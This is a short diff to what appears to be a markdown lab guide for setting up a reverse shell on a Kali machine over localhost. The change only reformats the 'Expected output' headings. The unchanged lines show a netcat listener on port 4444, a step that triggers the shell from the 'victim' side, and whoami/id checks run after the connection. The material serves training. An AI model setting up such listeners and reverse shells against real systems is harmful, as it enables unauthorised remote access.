@@ -16,8 +16,8 @@
   nc -nvlp 4444
   ```
 
-#### Expected output:
--listening on [any] 4444 ...
+#### **Expected output:** 
+- listening on [any] 4444 ...
 
 ### Step 2: Trigger Reverse Shell (Victim)
 - Open Terminal 2
@@ -42,7 +42,7 @@ connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48546
   id
   hostname
   ```
-  #### Expected outputs:
+  #### **Expected output:** 
     - whoami → kali
     - pwd → /home/kali
     - id → uid=1000(kali) gid=1000(kali) groups=1000(kali),...
